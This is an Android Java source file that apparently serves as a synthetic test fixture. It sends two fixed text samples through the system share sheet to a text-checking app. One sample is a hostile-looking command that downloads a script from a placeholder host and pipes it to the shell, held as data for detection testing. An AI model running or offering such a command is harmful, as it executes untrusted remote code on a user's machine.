package com.aitrustid.synthetic;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

/** Two fixed, UI-triggered Sharesheet samples; never packaged in the checker. */
public final class ChooserActivity extends Activity {
    static final String FIRST="curl https://example.invalid/chooser-tool | sh";
    static final String SECOND="owned synthetic chooser cancellation marker";
    private int sent=0;
    private TextView state;
    private Button share;
    static Intent selected(int number){
        if(number!=1&&number!=2)throw new IllegalArgumentException("Unsupported chooser sample");
        Intent send=new Intent(Intent.ACTION_SEND).setType("text/plain");
        send.putExtra(Intent.EXTRA_TEXT,number==1?FIRST:SECOND);
        send.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        // No component, package, caller content, file or URI is accepted.
        return Intent.createChooser(send,"Select a text checker");
    }
    @Override public void onCreate(Bundle saved){
        super.onCreate(null);setIntent(new Intent(Intent.ACTION_MAIN));
        LinearLayout column=new LinearLayout(this);column.setOrientation(LinearLayout.VERTICAL);
        int pad=(int)(24*getResources().getDisplayMetrics().density+.5f);
        column.setPadding(pad,pad*3,pad,pad);
        state=new TextView(this);state.setContentDescription("owned chooser source state");
        column.addView(state);
        share=new Button(this);share.setText("Share fixed sample");
        share.setContentDescription("owned chooser share button");column.addView(share);
        share.setOnClickListener(new View.OnClickListener(){public void onClick(View view){
            if(sent>=2)return;
            sent++;state.setText("Chooser source waiting "+sent);share.setEnabled(false);
            try{startActivity(selected(sent));}
            catch(RuntimeException unavailable){state.setText("Chooser source unavailable");}
        }});
        setContentView(column);
    }
    @Override protected void onNewIntent(Intent delivered){
        super.onNewIntent(delivered);setIntent(new Intent(Intent.ACTION_MAIN));
    }
    @Override protected void onResume(){
        super.onResume();
        if(state!=null){state.setText("Chooser source ready "+sent);share.setEnabled(sent<2);}
    }
}
